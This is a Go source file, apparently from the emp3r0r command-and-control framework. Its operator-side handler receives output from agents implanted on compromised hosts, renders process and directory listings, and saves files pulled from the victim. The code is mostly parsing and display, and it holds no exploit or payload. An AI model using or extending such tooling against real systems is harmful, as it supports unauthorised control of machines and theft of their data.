package cc

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/fatih/color"
	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/olekukonko/tablewriter"
)

// CmdResults receive response from agent and cache them
var CmdResults = make(map[string]string)

// mutex
var CmdResultsMutex = &sync.Mutex{}

// processAgentData deal with data from agent side
func processAgentData(data *emp3r0r_data.MsgTunData) {
	payloadSplit := strings.Split(data.Payload, emp3r0r_data.OpSep)
	op := payloadSplit[0]

	target := GetTargetFromTag(data.Tag)
	contrlIf := Targets[target]
	if target == nil || contrlIf == nil {
		CliPrintError("Target %s cannot be found, however, it left a message saying:\n%v",
			data.Tag, payloadSplit)
		return
	}

	switch op {

	// cmd output from agent
	case "cmd":
		cmd := payloadSplit[1]
		out := strings.Join(payloadSplit[2:], " ")
		outLines := strings.Split(out, "\n")

		// headless mode
		if IsAPIEnabled {
			// send to socket
			var resp APIResponse
			msg := fmt.Sprintf("%s:\n%s", cmd, out)
			resp.Cmd = cmd
			resp.MsgData = []byte(msg)
			resp.Alert = false
			resp.MsgType = CMD
			data, err := json.Marshal(resp)
			if err != nil {
				log.Printf("processAgentData cmd output: %v", err)
				return
			}
			_, err = APIConn.Write([]byte(data))
			if err != nil {
				log.Printf("processAgentData cmd output: %v", err)
			}
		}

		// screenshot command
		if strings.HasPrefix(cmd, "screenshot") {
			go func() {
				err = processScreenshot(out, target)
				if err != nil {
					CliPrintError("%v", err)
				}
			}()
		}

		// ps command
		if strings.HasPrefix(cmd, "#ps") {
			var procs []util.ProcEntry
			err = json.Unmarshal([]byte(out), &procs)
			if err != nil {
				CliPrintError("ps: %v:\n%s", err, out)
				return
			}

			// build table
			tdata := [][]string{}
			tableString := &strings.Builder{}
			table := tablewriter.NewWriter(tableString)
			table.SetHeader([]string{"Name", "PID", "PPID", "User"})
			table.SetBorder(true)
			table.SetRowLine(true)
			table.SetAutoWrapText(true)

			// color
			table.SetHeaderColor(tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
				tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
				tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
				tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor})

			table.SetColumnColor(tablewriter.Colors{tablewriter.FgHiBlueColor},
				tablewriter.Colors{tablewriter.FgBlueColor},
				tablewriter.Colors{tablewriter.FgBlueColor},
				tablewriter.Colors{tablewriter.FgBlueColor})

			// fill table
			for _, p := range procs {
				tdata = append(tdata, []string{p.Name, strconv.Itoa(p.PID), strconv.Itoa(p.PPID), p.Token})
			}
			table.AppendBulk(tdata)
			table.Render()
			// CliMsg("Listing processes:\033[0m\n%s", tableString.String())
			// return
			out = tableString.String()
			outLines = strings.Split(out, "\n")
		}

		// ls command
		if strings.HasPrefix(cmd, "ls") {
			var dents []util.Dentry
			err = json.Unmarshal([]byte(out), &dents)
			if err != nil {
				CliPrintError("ls: %v:\n%s", err, out)
				return
			}

			LsDir = nil // clear cache

			// build table
			tdata := [][]string{}
			tableString := &strings.Builder{}
			table := tablewriter.NewWriter(tableString)
			table.SetHeader([]string{"Name", "Type", "Size", "Time", "Permission"})
			table.SetRowLine(true)
			table.SetBorder(true)

			// color
			table.SetHeaderColor(tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
				tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
				tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
				tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
				tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor})

			table.SetColumnColor(tablewriter.Colors{tablewriter.FgHiBlueColor},
				tablewriter.Colors{tablewriter.FgBlueColor},
				tablewriter.Colors{tablewriter.FgBlueColor},
				tablewriter.Colors{tablewriter.FgBlueColor},
				tablewriter.Colors{tablewriter.FgBlueColor})

			// fill table
			for _, d := range dents {
				tdata = append(tdata, []string{d.Name, d.Ftype, d.Size, d.Date, d.Permission})
				if d.Ftype == "file" {
					LsDir = append(LsDir, d.Name)
				} else {
					LsDir = append(LsDir, d.Name+"/")
				}
			}
			table.AppendBulk(tdata)
			table.Render()
			// CliMsg("Listing current path:\033[0m\n%s", tableString.String())
			// return
			out = tableString.String()
			outLines = strings.Split(out, "\n")
		}

		// optimize output
		if len(outLines) > 20 {
			t := time.Now()
			logname := fmt.Sprintf("%scmd-%d-%02d-%02dT%02d:%02d:%02d.log",
				Temp,
				t.Year(), t.Month(), t.Day(),
				t.Hour(), t.Minute(), t.Second())

			CliPrintInfo("Output will be displayed in new window")
			err := ioutil.WriteFile(logname, []byte(out), 0600)
			if err != nil {
				CliPrintWarning(err.Error())
			}

			viewCmd := fmt.Sprintf(`less -f -r %s`,
				logname)

			// split window vertically
			if err = TmuxSplit("v", viewCmd); err == nil {
				CliPrintSuccess("View result in new window (press q to quit)")
				return
			}
			CliPrintError("Failed to opent tmux window: %v", err)
		}

		log.Printf("\n[%s] %s:\n%s\n\n", color.CyanString("%d", contrlIf.Index), color.HiMagentaString(cmd), color.HiWhiteString(out))
		// cache this cmd response
		CmdResultsMutex.Lock()
		CmdResults[cmd] = out
		CmdResultsMutex.Unlock()

	// save file from #get
	case "FILE":
		filepath := payloadSplit[1]

		// we only need the filename
		filename := util.FileBaseName(filepath)

		b64filedata := payloadSplit[2]
		filedata, err := base64.StdEncoding.DecodeString(b64filedata)
		if err != nil {
			CliPrintError("processAgentData failed to decode file data: %v", err)
			return
		}
		filewrite := FileGetDir + filename + ".downloading" // we will write to this file
		targetFile := FileGetDir + filename                 // will copy the downloaded file here
		targetSize := util.FileSize(targetFile)             // check if we reach this size
		f, err := os.OpenFile(filewrite, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
		if err != nil {
			CliPrintError("processAgentData write file: %v", err)
		}
		defer f.Close()

		// save to FileGetDir
		if !util.IsFileExist(FileGetDir) {
			err = os.MkdirAll(FileGetDir, 0700)
			if err != nil {
				CliPrintError("mkdir -p %s: %v", FileGetDir, err)
				return
			}
		}
		_, err = f.Write(filedata)
		if err != nil {
			CliPrintError("processAgentData failed to save file: %v", err)
			return
		}
		downloadedSize := float32(len(filedata)) / 1024
		sha256sumFile := tun.SHA256SumFile(filewrite)
		sha256sumPart := tun.SHA256SumRaw(filedata)
		CliPrintInfo("Downloaded %fKB (%s) to %s, sha256sum of downloaded file is %s", downloadedSize, sha256sumPart, filewrite, sha256sumFile)

		// have we finished downloading?
		nowSize := util.FileSize(filewrite)
		if nowSize == targetSize {
			err = os.Rename(filewrite, targetFile)
			if err != nil {
				CliPrintError("Failed to save downloaded file %s: %v", targetFile, err)
			}
			CliPrintSuccess("Downloaded %d bytes to %s", nowSize, targetFile)
			return
		}
		CliPrintWarning("Incomplete download (%d of %d bytes), will continue if you run GET again", nowSize, targetSize)

	default:
	}
}
